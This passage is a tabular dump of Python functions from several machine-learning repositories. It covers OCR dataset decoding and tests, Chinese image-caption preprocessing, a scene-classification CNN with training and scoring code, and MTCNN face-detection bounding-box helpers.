    keys_to_features = {'image/encoded': tf.FixedLenFeature((), tf.string, default_value=''), 'image/format': tf.FixedLenFeature((), tf.string, default_value='png'), 'image/width': tf.FixedLenFeature([1], tf.int64, default_value=zero), 'image/orig_width': tf.FixedLenFeature([1], tf.int64, default_value=zero), 'image/class': tf.FixedLenFeature([config['max_sequence_length']], tf.int64), 'image/unpadded_class': tf.VarLenFeature(tf.int64), 'image/text': tf.FixedLenFeature([1], tf.string, default_value='')}
    items_to_handlers = {'image': slim.tfexample_decoder.Image(shape=config['image_shape'], image_key='image/encoded', format_key='image/format'), 'label': slim.tfexample_decoder.Tensor(tensor_key='image/class'), 'text': slim.tfexample_decoder.Tensor(tensor_key='image/text'), 'num_of_views': _NumOfViewsHandler(width_key='image/width', original_width_key='image/orig_width', num_of_views=config['num_of_views'])}
    decoder = slim.tfexample_decoder.TFExampleDecoder(keys_to_features, items_to_handlers)
    charset_file = os.path.join(dataset_dir, config['charset_filename'])
    charset = read_charset(charset_file)
    print(charset)
    file_pattern = os.path.join(dataset_dir, config['splits'][split_name]['pattern'])
    return slim.dataset.Dataset(data_sources=file_pattern, reader=tf.TFRecordReader, decoder=decoder, num_samples=config['splits'][split_name]['size'], items_to_descriptions=config['items_to_descriptions'], charset=charset, num_char_classes=len(charset), num_of_views=config['num_of_views'], max_sequence_length=config['max_sequence_length'], null_code=config['null_code'])"
A-bone1/Attention-ocr-Chinese-Version,__init__,"def __init__(self, width_key, original_width_key, num_of_views):
    super(_NumOfViewsHandler, self).__init__([width_key, original_width_key])
    self._width_key = width_key
    self._original_width_key = original_width_key
    self._num_of_views = num_of_views"
A-bone1/Attention-ocr-Chinese-Version,tensors_to_item,"def tensors_to_item(self, keys_to_tensors):
    return tf.to_int64(self._num_of_views * keys_to_tensors[self._original_width_key] / keys_to_tensors[self._width_key])"
A-bone1/Attention-ocr-Chinese-Version,get_test_split,"def get_test_split():
    config = fsns.DEFAULT_CONFIG.copy()
    config['splits'] = {'test': {'size': 50, 'pattern': 'fsns-00000-of-00001'}}
    return fsns.get_split('test', dataset_dir(), config)"
A-bone1/Attention-ocr-Chinese-Version,dataset_dir,"def dataset_dir():
    return os.path.join(os.path.dirname(__file__), 'testdata/fsns')"
A-bone1/Attention-ocr-Chinese-Version,test_decodes_example_proto,"def test_decodes_example_proto(self):
    expected_label = range(37)
    (expected_image, encoded) = unittest_utils.create_random_image('PNG', shape=(150, 600, 3))
    serialized = unittest_utils.create_serialized_example({'image/encoded': [encoded], 'image/format': ['PNG'], 'image/class': expected_label, 'image/unpadded_class': range(10), 'image/text': ['Raw text'], 'image/orig_width': [150], 'image/width': [600]})
    decoder = fsns.get_split('train', dataset_dir()).decoder
    with self.test_session() as sess:
        data_tuple = collections.namedtuple('DecodedData', decoder.list_items())
        data = sess.run(data_tuple(*decoder.decode(serialized)))
    self.assertAllEqual(expected_image, data.image)
    self.assertAllEqual(expected_label, data.label)
    self.assertEqual(['Raw text'], data.text)
    self.assertEqual([1], data.num_of_views)"
A-bone1/Attention-ocr-Chinese-Version,test_label_has_shape_defined,"def test_label_has_shape_defined(self):
    serialized = 'fake'
    decoder = fsns.get_split('train', dataset_dir()).decoder
    [label_tf] = decoder.decode(serialized, ['label'])
    self.assertEqual(label_tf.get_shape().dims[0], 37)"
A-bone1/Attention-ocr-Chinese-Version,test_dataset_tuple_has_all_extra_attributes,"def test_dataset_tuple_has_all_extra_attributes(self):
    dataset = fsns.get_split('train', dataset_dir())
    self.assertTrue(dataset.charset)
    self.assertTrue(dataset.num_char_classes)
    self.assertTrue(dataset.num_of_views)
    self.assertTrue(dataset.max_sequence_length)
    self.assertTrue(dataset.null_code)"
A-bone1/Attention-ocr-Chinese-Version,test_can_use_the_test_data,"def test_can_use_the_test_data(self):
    batch_size = 1
    dataset = get_test_split()
    provider = slim.dataset_data_provider.DatasetDataProvider(dataset, shuffle=True, common_queue_capacity=2 * batch_size, common_queue_min=batch_size)
    (image_tf, label_tf) = provider.get(['image', 'label'])
    with self.test_session() as sess:
        sess.run(tf.global_variables_initializer())
        with slim.queues.QueueRunners(sess):
            (image_np, label_np) = sess.run([image_tf, label_tf])
    self.assertEqual((150, 600, 3), image_np.shape)
    self.assertEqual((37,), label_np.shape)"
A-bone1/Attention-ocr-Chinese-Version,get_split,"def get_split(split_name, dataset_dir=None, config=None):
    if not dataset_dir:
        dataset_dir = DEFAULT_DATASET_DIR
    if not config:
        config = DEFAULT_CONFIG
    return fsns.get_split(split_name, dataset_dir, config)"
A-bone1/Attention-ocr-Chinese-Version,create_random_image,"def create_random_image(image_format, shape):
    """"""Creates an image with random values.

  Args:
    image_format: An image format (PNG or JPEG).
    shape: A tuple with image shape (including channels).

  Returns:
    A tuple (<numpy ndarray>, <a string with encoded image>)
  """"""
    image = np.random.randint(low=0, high=255, size=shape, dtype='uint8')
    io = StringIO.StringIO()
    image_pil = PILImage.fromarray(image)
    image_pil.save(io, image_format, subsampling=0, quality=100)
    return (image, io.getvalue())"
A-bone1/Attention-ocr-Chinese-Version,create_serialized_example,"def create_serialized_example(name_to_values):
    """"""Creates a tf.Example proto using a dictionary.

  It automatically detects type of values and define a corresponding feature.

  Args:
    name_to_values: A dictionary.

  Returns:
    tf.Example proto.
  """"""
    example = tf.train.Example()
    for (name, values) in name_to_values.items():
        feature = example.features.feature[name]
        if isinstance(values[0], str):
            add = feature.bytes_list.value.extend
        elif isinstance(values[0], float):
            add = feature.float32_list.value.extend
        elif isinstance(values[0], int):
            add = feature.int64_list.value.extend
        else:
            raise AssertionError('Unsupported type: %s' % type(values[0]))
        add(values)
    return example.SerializeToString()"
A-bone1/Attention-ocr-Chinese-Version,test_creates_an_image_of_specified_shape,"def test_creates_an_image_of_specified_shape(self):
    (image, _) = unittest_utils.create_random_image('PNG', (10, 20, 3))
    self.assertEqual(image.shape, (10, 20, 3))"
A-bone1/Attention-ocr-Chinese-Version,test_encoded_image_corresponds_to_numpy_array,"def test_encoded_image_corresponds_to_numpy_array(self):
    (image, encoded) = unittest_utils.create_random_image('PNG', (20, 10, 3))
    pil_image = PILImage.open(StringIO.StringIO(encoded))
    self.assertAllEqual(image, np.array(pil_image))"
A-bone1/Attention-ocr-Chinese-Version,test_created_example_has_correct_values,"def test_created_example_has_correct_values(self):
    example_serialized = unittest_utils.create_serialized_example({'labels': [1, 2, 3], 'data': ['FAKE']})
    example = tf.train.Example()
    example.ParseFromString(example_serialized)
    self.assertProtoEquals('\n      features {\n        feature {\n          key: ""labels""\n           value { int64_list {\n             value: 1\n             value: 2\n             value: 3\n           }}\n         }\n         feature {\n           key: ""data""\n           value { bytes_list {\n             value: ""FAKE""\n           }}\n         }\n      }\n    ', example)"
AIChallenger/AI_Challenger_2017,_int64_feature,"def _int64_feature(value):
    """"""Wrapper for inserting an int64 Feature into a SequenceExample proto.""""""
    return tf.train.Feature(int64_list=tf.train.Int64List(value=[value]))"
AIChallenger/AI_Challenger_2017,_bytes_feature,"def _bytes_feature(value):
    """"""Wrapper for inserting a bytes Feature into a SequenceExample proto.""""""
    return tf.train.Feature(bytes_list=tf.train.BytesList(value=[str(value)]))"
AIChallenger/AI_Challenger_2017,_int64_feature_list,"def _int64_feature_list(values):
    """"""Wrapper for inserting an int64 FeatureList into a SequenceExample proto.""""""
    return tf.train.FeatureList(feature=[_int64_feature(v) for v in values])"
AIChallenger/AI_Challenger_2017,_bytes_feature_list,"def _bytes_feature_list(values):
    """"""Wrapper for inserting a bytes FeatureList into a SequenceExample proto.""""""
    return tf.train.FeatureList(feature=[_bytes_feature(v) for v in values])"
AIChallenger/AI_Challenger_2017,_to_sequence_example,"def _to_sequence_example(image, decoder, vocab):
    """"""Builds a SequenceExample proto for an image-caption pair.
    Args:
      image: An ImageMetadata object.
      decoder: An ImageDecoder object.
      vocab: A Vocabulary object.
    Returns:
      A SequenceExample proto.
    """"""
    with tf.gfile.FastGFile(image.filename, 'r') as f:
        encoded_image = f.read()
    try:
        decoder.decode_jpeg(encoded_image)
    except (tf.errors.InvalidArgumentError, AssertionError):
        print('Skipping file with invalid JPEG data: %s' % image.filename)
        return
    context = tf.train.Features(feature={'image/id': _int64_feature(image.id), 'image/data': _bytes_feature(encoded_image)})
    assert len(image.captions) == 1
    caption = image.captions[0]
    caption_ids = [vocab.word_to_id(word) for word in caption]
    feature_lists = tf.train.FeatureLists(feature_list={'image/caption': _bytes_feature_list(caption), 'image/caption_ids': _int64_feature_list(caption_ids)})
    sequence_example = tf.train.SequenceExample(context=context, feature_lists=feature_lists)
    return sequence_example"
AIChallenger/AI_Challenger_2017,_process_image_files,"def _process_image_files(thread_index, ranges, name, images, decoder, vocab, num_shards):
    """"""Processes and saves a subset of images as TFRecord files in one thread.
    Args:
      thread_index: Integer thread identifier within [0, len(ranges)].
      ranges: A list of pairs of integers specifying the ranges of the dataset to
        process in parallel.
      name: Unique identifier specifying the dataset.
      images: List of ImageMetadata.
      decoder: An ImageDecoder object.
      vocab: A Vocabulary object.
      num_shards: Integer number of shards for the output files.
    """"""
    num_threads = len(ranges)
    assert not num_shards % num_threads
    num_shards_per_batch = int(num_shards / num_threads)
    shard_ranges = np.linspace(ranges[thread_index][0], ranges[thread_index][1], num_shards_per_batch + 1).astype(int)
    num_images_in_thread = ranges[thread_index][1] - ranges[thread_index][0]
    counter = 0
    for s in range(num_shards_per_batch):
        shard = thread_index * num_shards_per_batch + s
        output_filename = '%s-%.5d-of-%.5d' % (name, shard, num_shards)
        output_file = os.path.join(FLAGS.output_dir, output_filename)
        writer = tf.python_io.TFRecordWriter(output_file)
        shard_counter = 0
        images_in_shard = np.arange(shard_ranges[s], shard_ranges[s + 1], dtype=int)
        for i in images_in_shard:
            image = images[i]
            sequence_example = _to_sequence_example(image, decoder, vocab)
            if sequence_example is not None:
                writer.write(sequence_example.SerializeToString())
                shard_counter += 1
                counter += 1
            if not counter % 1000:
                print('%s [thread %d]: Processed %d of %d items in thread batch.' % (datetime.now(), thread_index, counter, num_images_in_thread))
                sys.stdout.flush()
        writer.close()
        print('%s [thread %d]: Wrote %d image-caption pairs to %s' % (datetime.now(), thread_index, shard_counter, output_file))
        sys.stdout.flush()
        shard_counter = 0
    print('%s [thread %d]: Wrote %d image-caption pairs to %d shards.' % (datetime.now(), thread_index, counter, num_shards_per_batch))
    sys.stdout.flush()"
AIChallenger/AI_Challenger_2017,_process_dataset,"def _process_dataset(name, images, vocab, num_shards):
    """"""Processes a complete data set and saves it as a TFRecord.
    Args:
      name: Unique identifier specifying the dataset.
      images: List of ImageMetadata.
      vocab: A Vocabulary object.
      num_shards: Integer number of shards for the output files.
    """"""
    images = [ImageMetadata(image.id, image.filename, [caption]) for image in images for caption in image.captions]
    random.seed(12345)
    random.shuffle(images)
    num_threads = min(num_shards, FLAGS.num_threads)
    spacing = np.linspace(0, len(images), num_threads + 1).astype(np.int)
    ranges = []
    threads = []
    for i in range(len(spacing) - 1):
        ranges.append([spacing[i], spacing[i + 1]])
    coord = tf.train.Coordinator()
    decoder = ImageDecoder()
    print('Launching %d threads for spacings: %s' % (num_threads, ranges))
    for thread_index in range(len(ranges)):
        args = (thread_index, ranges, name, images, decoder, vocab, num_shards)
        t = threading.Thread(target=_process_image_files, args=args)
        t.start()
        threads.append(t)
    coord.join(threads)
    print(""%s: Finished processing all %d image-caption pairs in data set '%s'."" % (datetime.now(), len(images), name))"
AIChallenger/AI_Challenger_2017,_create_vocab,"def _create_vocab(captions):
    """"""Creates the vocabulary of word to word_id.
    The vocabulary is saved to disk in a text file of word counts. The id of each
    word in the file is its corresponding 0-based line number.
    Args:
      captions: A list of lists of strings.
    Returns:
      A Vocabulary object.
    """"""
    print('Creating vocabulary.')
    counter = Counter()
    for c in captions:
        counter.update(c)
    print('Total words:', len(counter))
    word_counts = [x for x in counter.items() if x[1] >= FLAGS.min_word_count]
    word_counts.sort(key=lambda x: x[1], reverse=True)
    print('Words in vocabulary:', len(word_counts))
    with tf.gfile.FastGFile(FLAGS.word_counts_output_file, 'w') as f:
        f.write('\n'.join(['%s %d' % (w, c) for (w, c) in word_counts]))
    print('Wrote vocabulary file:', FLAGS.word_counts_output_file)
    reverse_vocab = [x[0] for x in word_counts]
    unk_id = len(reverse_vocab)
    vocab_dict = dict([(x, y) for (y, x) in enumerate(reverse_vocab)])
    vocab = Vocabulary(vocab_dict, unk_id)
    return vocab"
AIChallenger/AI_Challenger_2017,_process_caption_jieba,"def _process_caption_jieba(caption):
    """"""Processes a Chinese caption string into a list of tonenized words.
    Args:
      caption: A string caption.
    Returns:
      A list of strings; the tokenized caption.
    """"""
    tokenized_caption = [FLAGS.start_word]
    tokenized_caption.extend(jieba.cut(caption, cut_all=False))
    tokenized_caption.append(FLAGS.end_word)
    return tokenized_caption"
AIChallenger/AI_Challenger_2017,_load_and_process_metadata,"def _load_and_process_metadata(captions_file, image_dir):
    """"""Loads image metadata from a JSON file and processes the captions.
    Args:
      captions_file: Json file containing caption annotations.
      image_dir: Directory containing the image files.
    Returns:
      A list of ImageMetadata.
    """"""
    image_id = set([])
    id_to_captions = {}
    with open(captions_file, 'r') as f:
        caption_data = json.load(f)
    for data in caption_data:
        image_name = data['image_id'].split('.')[0]
        descriptions = data['caption']
        if image_name not in image_id:
            id_to_captions.setdefault(image_name, [])
            image_id.add(image_name)
        caption_num = len(descriptions)
        for i in range(caption_num):
            caption_temp = descriptions[i].strip().strip('。').replace('\n', '')
            if caption_temp != '':
                id_to_captions[image_name].append(caption_temp)
    print('Loaded caption metadata for %d images from %s and image_id num is %s' % (len(id_to_captions), captions_file, len(image_id)))
    print('Proccessing captions.')
    image_metadata = []
    num_captions = 0
    id = 0
    for base_filename in image_id:
        filename = os.path.join(image_dir, base_filename + '.jpg')
        captions = [_process_caption_jieba(c) for c in id_to_captions[base_filename]]
        image_metadata.append(ImageMetadata(id, filename, captions))
        id = id + 1
        num_captions += len(captions)
    print('Finished processing %d captions for %d images in %s' % (num_captions, len(id_to_captions), captions_file))
    return image_metadata"
AIChallenger/AI_Challenger_2017,main,"def main(unused_argv):

    def _is_valid_num_shards(num_shards):
        """"""Returns True if num_shards is compatible with FLAGS.num_threads.""""""
        return num_shards < FLAGS.num_threads or not num_shards % FLAGS.num_threads
    assert _is_valid_num_shards(FLAGS.train_shards), 'Please make the FLAGS.num_threads commensurate with FLAGS.train_shards'
    assert _is_valid_num_shards(FLAGS.val_shards), 'Please make the FLAGS.num_threads commensurate with FLAGS.val_shards'
    assert _is_valid_num_shards(FLAGS.test_shards), 'Please make the FLAGS.num_threads commensurate with FLAGS.test_shards'
    if not tf.gfile.IsDirectory(FLAGS.output_dir):
        tf.gfile.MakeDirs(FLAGS.output_dir)
    train_dataset = _load_and_process_metadata(FLAGS.captions_file, FLAGS.image_dir)
    train_captions = [c for image in train_dataset for c in image.captions]
    vocab = _create_vocab(train_captions)
    _process_dataset('train', train_dataset, vocab, FLAGS.train_shards)"
AIChallenger/AI_Challenger_2017,__init__,"def __init__(self, vocab, unk_id):
    """"""Initializes the vocabulary.
        Args:
          vocab: A dictionary of word to word_id.
          unk_id: Id of the special 'unknown' word.
        """"""
    self._vocab = vocab
    self._unk_id = unk_id"
AIChallenger/AI_Challenger_2017,word_to_id,"def word_to_id(self, word):
    """"""Returns the integer id of a word string.""""""
    if word in self._vocab:
        return self._vocab[word]
    else:
        return self._unk_id"
AIChallenger/AI_Challenger_2017,__init__,"def __init__(self):
    self._sess = tf.Session()
    self._encoded_jpeg = tf.placeholder(dtype=tf.string)
    self._decode_jpeg = tf.image.decode_jpeg(self._encoded_jpeg, channels=3)"
AIChallenger/AI_Challenger_2017,decode_jpeg,"def decode_jpeg(self, encoded_jpeg):
    image = self._sess.run(self._decode_jpeg, feed_dict={self._encoded_jpeg: encoded_jpeg})
    assert len(image.shape) == 3
    assert image.shape[2] == 3
    return image"
AIChallenger/AI_Challenger_2017,_is_valid_num_shards,"def _is_valid_num_shards(num_shards):
    """"""Returns True if num_shards is compatible with FLAGS.num_threads.""""""
    return num_shards < FLAGS.num_threads or not num_shards % FLAGS.num_threads"
AIChallenger/AI_Challenger_2017,weight_variable,"def weight_variable(shape, stddev=0.1):
    initial = tf.truncated_normal(shape, stddev=stddev)
    return tf.Variable(initial)"
AIChallenger/AI_Challenger_2017,bias_variable,"def bias_variable(shape, bais=0.1):
    initial = tf.constant(bais, shape=shape)
    return tf.Variable(initial)"
AIChallenger/AI_Challenger_2017,conv2d,"def conv2d(x, w):
    return tf.nn.conv2d(x, w, [1, 1, 1, 1], 'SAME')"
AIChallenger/AI_Challenger_2017,max_pool_2x2,"def max_pool_2x2(x):
    return tf.nn.max_pool(x, [1, 2, 2, 1], [1, 2, 2, 1], 'SAME')"
AIChallenger/AI_Challenger_2017,max_pool_3x3,"def max_pool_3x3(x):
    return tf.nn.max_pool(x, [1, 3, 3, 1], [1, 2, 2, 1], 'SAME')"
AIChallenger/AI_Challenger_2017,avg_pool_3x3,"def avg_pool_3x3(x):
    return tf.nn.avg_pool(x, [1, 3, 3, 1], [1, 2, 2, 1], 'SAME')"
AIChallenger/AI_Challenger_2017,inference,"def inference(features, one_hot_labels):
    W_conv1 = weight_variable([5, 5, 3, 64], stddev=0.0001)
    b_conv1 = bias_variable([64])
    h_conv1 = tf.nn.relu(conv2d(features, W_conv1) + b_conv1)
    h_pool1 = max_pool_3x3(h_conv1)
    norm1 = tf.nn.lrn(h_pool1, 4, bias=1.0, alpha=0.001 / 9.0, beta=0.75, name='norm1')
    W_conv2 = weight_variable([5, 5, 64, 64], stddev=0.01)
    b_conv2 = bias_variable([64])
    h_conv2 = tf.nn.relu(conv2d(norm1, W_conv2) + b_conv2)
    norm2 = tf.nn.lrn(h_conv2, 4, bias=1.0, alpha=0.001 / 9.0, beta=0.75, name='norm2')
    h_pool2 = max_pool_3x3(norm2)
    W_conv3 = weight_variable([5, 5, 64, 64], stddev=0.01)
    b_conv3 = bias_variable([64])
    h_conv3 = tf.nn.relu(conv2d(h_pool2, W_conv3) + b_conv3)
    h_pool3 = max_pool_3x3(h_conv3)
    W_fc1 = weight_variable([16 * 16 * 64, 128])
    b_fc1 = bias_variable([128])
    h_pool3_flat = tf.reshape(h_pool3, [-1, 16 * 16 * 64])
    h_fc1 = tf.nn.relu(tf.matmul(h_pool3_flat, W_fc1) + b_fc1)
    keep_prob = tf.placeholder('float')
    h_fc1_drop = tf.nn.dropout(h_fc1, keep_prob)
    W_fc2 = weight_variable([128, 80])
    b_fc2 = bias_variable([80])
    y_conv = tf.matmul(h_fc1_drop, W_fc2) + b_fc2
    cross_entropy = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(labels=one_hot_labels, logits=y_conv))
    train_step = tf.train.AdamOptimizer(LEARNINGRATE).minimize(cross_entropy)
    return (train_step, cross_entropy, y_conv, keep_prob)"
AIChallenger/AI_Challenger_2017,train,"def train(train_dir, annotations, max_step, checkpoint_dir='./checkpoint/'):
    scene_data = scene_input.scene_data_fn(train_dir, annotations)
    features = tf.placeholder('float32', shape=[None, IMAGE_SIZE, IMAGE_SIZE, IMAGE_CHANNEL], name='features')
    labels = tf.placeholder('float32', [None], name='labels')
    one_hot_labels = tf.one_hot(indices=tf.cast(labels, tf.int32), depth=80)
    (train_step, cross_entropy, logits, keep_prob) = network.inference(features, one_hot_labels)
    correct_prediction = tf.equal(tf.argmax(logits, 1), tf.argmax(one_hot_labels, 1))
    accuracy = tf.reduce_mean(tf.cast(correct_prediction, 'float'))
    with tf.Session() as sess:
        saver = tf.train.Saver()
        ckpt = tf.train.get_checkpoint_state(checkpoint_dir)
        if ckpt and ckpt.model_checkpoint_path:
            print('Restore the model from checkpoint %s' % ckpt.model_checkpoint_path)
            saver.restore(sess, ckpt.model_checkpoint_path)
            start_step = int(ckpt.model_checkpoint_path.split('/')[-1].split('-')[-1])
        else:
            sess.run(tf.global_variables_initializer())
            start_step = 0
            print('start training from new state')
        logger = scene_input.train_log(LOGNAME)
        for step in range(start_step, start_step + max_step):
            start_time = time.time()
            (x, y) = scene_data.next_batch(BATCH_SIZE, IMAGE_SIZE)
            sess.run(train_step, feed_dict={features: x, labels: y, keep_prob: 0.5})
            if step % 50 == 0:
                train_accuracy = sess.run(accuracy, feed_dict={features: x, labels: y, keep_prob: 1})
                train_loss = sess.run(cross_entropy, feed_dict={features: x, labels: y, keep_prob: 1})
                duration = time.time() - start_time
                logger.info('step %d: training accuracy %g, loss is %g (%0.3f sec)' % (step, train_accuracy, train_loss, duration))
            if step % 1000 == 1:
                saver.save(sess, CHECKFILE, global_step=step)
                print('writing checkpoint at step %s' % step)"
AIChallenger/AI_Challenger_2017,test,"def test(test_dir, checkpoint_dir='./checkpoint/'):
    test_images = os.listdir(test_dir)
    features = tf.placeholder('float32', shape=[None, IMAGE_SIZE, IMAGE_SIZE, IMAGE_CHANNEL], name='features')
    labels = tf.placeholder('float32', [None], name='labels')
    one_hot_labels = tf.one_hot(indices=tf.cast(labels, tf.int32), depth=80)
    (train_step, cross_entropy, logits, keep_prob) = network.inference(features, one_hot_labels)
    (values, indices) = tf.nn.top_k(logits, 3)
    with tf.Session() as sess:
        saver = tf.train.Saver()
        ckpt = tf.train.get_checkpoint_state(checkpoint_dir)
        if ckpt and ckpt.model_checkpoint_path:
            print('Restore the model from checkpoint %s' % ckpt.model_checkpoint_path)
            saver.restore(sess, ckpt.model_checkpoint_path)
            start_step = int(ckpt.model_checkpoint_path.split('/')[-1].split('-')[-1])
        else:
            raise Exception('no checkpoint find')
        result = []
        for test_image in test_images:
            temp_dict = {}
            x = scene_input.img_resize(os.path.join(test_dir, test_image), IMAGE_SIZE)
            predictions = np.squeeze(sess.run(indices, feed_dict={features: np.expand_dims(x, axis=0), keep_prob: 1}), axis=0)
            temp_dict['image_id'] = test_image
            temp_dict['label_id'] = predictions.tolist()
            result.append(temp_dict)
            print('image %s is %d,%d,%d' % (test_image, predictions[0], predictions[1], predictions[2]))
        with open('submit.json', 'w') as f:
            json.dump(result, f)
            print('write result json, num is %d' % len(result))"
AIChallenger/AI_Challenger_2017,__load_data,"def __load_data(submit_file, reference_file):
    with open(submit_file, 'r') as file1:
        submit_data = json.load(file1)
    with open(reference_file, 'r') as file1:
        ref_data = json.load(file1)
    if len(submit_data) != len(ref_data):
        result['warning'].append('Inconsistent number of images between submission and reference data \n')
    submit_dict = {}
    ref_dict = {}
    for item in submit_data:
        submit_dict[item['image_id']] = item['label_id']
    for item in ref_data:
        ref_dict[item['image_id']] = int(item['label_id'])
    return (submit_dict, ref_dict)"
AIChallenger/AI_Challenger_2017,__eval_result,"def __eval_result(submit_dict, ref_dict):
    right_count = 0
    for (key, value) in ref_dict.items():
        if key not in set(submit_dict.keys()):
            result['warning'].append('lacking image %s in your submission file \n' % key)
            print('warnning: lacking image %s in your submission file' % key)
            continue
        if value in submit_dict[key][:3]:
            right_count += 1
    result['score'] = str(float(right_count) / max(len(ref_dict), 1e-05))
    return result"
AIChallenger/AI_Challenger_2017,img_resize,"def img_resize(imgpath, img_size):
    img = Image.open(imgpath)
    if img.width > img.height:
        scale = float(img_size) / float(img.height)
        img = np.array(cv2.resize(np.array(img), (int(img.width * scale + 1), img_size))).astype(np.float32)
    else:
        scale = float(img_size) / float(img.width)
        img = np.array(cv2.resize(np.array(img), (img_size, int(img.height * scale + 1)))).astype(np.float32)
    img = (img[(img.shape[0] - img_size) // 2:(img.shape[0] - img_size) // 2 + img_size, (img.shape[1] - img_size) // 2:(img.shape[1] - img_size) // 2 + img_size, :] - 127) / 255
    return img"
AIChallenger/AI_Challenger_2017,train_log,"def train_log(filename='logfile'):
    logger_name = 'filename'
    logger = logging.getLogger(logger_name)
    logger.setLevel(logging.DEBUG)
    log_path = './' + filename + '.log'
    fh = logging.FileHandler(log_path)
    ch = logging.StreamHandler()
    fmt = '%(asctime)-15s %(levelname)s %(filename)s %(lineno)d %(process)d %(message)s'
    datefmt = '%a %d %b %Y %H:%M:%S'
    formatter = logging.Formatter(fmt, datefmt)
    fh.setFormatter(formatter)
    ch.setFormatter(formatter)
    logger.addHandler(fh)
    logger.addHandler(ch)
    return logger"
AIChallenger/AI_Challenger_2017,__init__,"def __init__(self, image_path, label_path):
    self.data_dict = {}
    with open(label_path, 'r') as f:
        label_list = json.load(f)
    for image in label_list:
        self.data_dict[image['image_id']] = int(image['label_id'])
    self.start = 0
    self.end = 0
    self.Length = len(self.data_dict)
    self.img_name = list(self.data_dict.keys())
    self.image_path = image_path"
AIChallenger/AI_Challenger_2017,img_resize,"def img_resize(self, imgpath, img_size):
    img = Image.open(imgpath)
    if img.width > img.height:
        scale = float(img_size) / float(img.height)
        img = np.array(cv2.resize(np.array(img), (int(img.width * scale + 1), img_size))).astype(np.float32)
    else:
        scale = float(img_size) / float(img.width)
        img = np.array(cv2.resize(np.array(img), (img_size, int(img.height * scale + 1)))).astype(np.float32)
    img = (img[(img.shape[0] - img_size) // 2:(img.shape[0] - img_size) // 2 + img_size, (img.shape[1] - img_size) // 2:(img.shape[1] - img_size) // 2 + img_size, :] - 127) / 255
    return img"
AIChallenger/AI_Challenger_2017,next_batch,"def next_batch(self, batch_size, img_size=32):
    self.start = self.end
    if self.start >= self.Length:
        self.start = 0
    img_data = []
    img_label = []
    index = self.start
    while len(img_data) < batch_size:
        if index >= self.Length:
            index = 0
        img_data.append(self.img_resize(os.path.join(self.image_path, self.img_name[index]), img_size))
        img_label.append(self.data_dict[self.img_name[index]])
        index += 1
    self.end = index
    return (np.array(img_data), np.array(img_label))"
AITTSMD/MTCNN-Tensorflow,__init__,"def __init__(self, detectors, min_face_size=20, stride=2, threshold=[0.6, 0.7, 0.7], scale_factor=0.79, slide_window=False):
    self.pnet_detector = detectors[0]
    self.rnet_detector = detectors[1]
    self.onet_detector = detectors[2]
    self.min_face_size = min_face_size
    self.stride = stride
    self.thresh = threshold
    self.scale_factor = scale_factor
    self.slide_window = slide_window"
AITTSMD/MTCNN-Tensorflow,convert_to_square,"def convert_to_square(self, bbox):
    """"""
            convert bbox to square
        Parameters:
        ----------
            bbox: numpy array , shape n x 5
                input bbox
        Returns:
        -------
            square bbox
        """"""
    square_bbox = bbox.copy()
    h = bbox[:, 3] - bbox[:, 1] + 1
    w = bbox[:, 2] - bbox[:, 0] + 1
    max_side = np.maximum(h, w)
    square_bbox[:, 0] = bbox[:, 0] + w * 0.5 - max_side * 0.5
    square_bbox[:, 1] = bbox[:, 1] + h * 0.5 - max_side * 0.5
    square_bbox[:, 2] = square_bbox[:, 0] + max_side - 1
    square_bbox[:, 3] = square_bbox[:, 1] + max_side - 1
    return square_bbox"
AITTSMD/MTCNN-Tensorflow,calibrate_box,"def calibrate_box(self, bbox, reg):
    """"""
            calibrate bboxes
        Parameters:
        ----------
            bbox: numpy array, shape n x 5
                input bboxes
            reg:  numpy array, shape n x 4
                bboxes adjustment
        Returns:
        -------
            bboxes after refinement
        """"""
    bbox_c = bbox.copy()
    w = bbox[:, 2] - bbox[:, 0] + 1
    w = np.expand_dims(w, 1)
    h = bbox[:, 3] - bbox[:, 1] + 1
    h = np.expand_dims(h, 1)
    reg_m = np.hstack([w, h, w, h])
    aug = reg_m * reg
    bbox_c[:, 0:4] = bbox_c[:, 0:4] + aug
    return bbox_c"
AITTSMD/MTCNN-Tensorflow,generate_bbox,"def generate_bbox(self, cls_map, reg, scale, threshold):
    """"""
            generate bbox from feature cls_map according to the threshold
        Parameters:
        ----------
            cls_map: numpy array , n x m 
                detect score for each position
            reg: numpy array , n x m x 4
                bbox
            scale: float number
                scale of this detection
            threshold: float number
                detect threshold
        Returns:
        -------
            bbox array
        """"""
    stride = 2
    cellsize = 12
    t_index = np.where(cls_map > threshold)
    if t_index[0].size == 0:
        return np.array([])
    (dx1, dy1, dx2, dy2) = [reg[t_index[0], t_index[1], i] for i in range(4)]
    reg = np.array([dx1, dy1, dx2, dy2])
    score = cls_map[t_index[0], t_index[1]]
    boundingbox = np.vstack([np.round(stride * t_index[1] / scale), np.round(stride * t_index[0] / scale), np.round((stride * t_index[1] + cellsize) / scale), np.round((stride * t_index[0] + cellsize) / scale), score, reg])
    return boundingbox.T"
AITTSMD/MTCNN-Tensorflow,processed_image,"def processed_image(self, img, scale):
    """"""
        rescale/resize the image according to the scale
        :param img: image
        :param scale:
        :return: resized image
        """"""
    (height, width, channels) = img.shape
    new_height = int(height * scale)
    new_width = int(width * scale)
    new_dim = (new_width, new_height)
    img_resized = cv2.resize(img, new_dim, interpolation=cv2.INTER_LINEAR)
    img_resized = (img_resized - 127.5) / 128
    return img_resized"
AITTSMD/MTCNN-Tensorflow,pad,"def pad(self, bboxes, w, h):
    """"""
            pad the the bboxes, alse restrict the size of it
        Parameters:
        ----------
            bboxes: numpy array, n x 5
                input bboxes
            w: float number
                width of the input image
            h: float number
                height of the input image
        Returns :
        ------
            dy, dx : numpy array, n x 1
                start point of the bbox in target image
            edy, edx : numpy array, n x 1
                end point of the bbox in target image
            y, x : numpy array, n x 1
                start point of the bbox in original image
            ex, ex : numpy array, n x 1
                end point of the bbox in original image
            tmph, tmpw: numpy array, n x 1
                height and width of the bbox
        """"""
    (tmpw, tmph) = (bboxes[:, 2] - bboxes[:, 0] + 1, bboxes[:, 3] - bboxes[:, 1] + 1)
    num_box = bboxes.shape[0]
    (dx, dy) = (np.zeros((num_box,)), np.zeros((num_box,)))
    (edx, edy) = (tmpw.copy() - 1, tmph.copy() - 1)
    (x, y, ex, ey) = (bboxes[:, 0], bboxes[:, 1], bboxes[:, 2], bboxes[:, 3])
    tmp_index = np.where(ex > w - 1)
    edx[tmp_index] = tmpw[tmp_index] + w - 2 - ex[tmp_index]
    ex[tmp_index] = w - 1
    tmp_index = np.where(ey > h - 1)
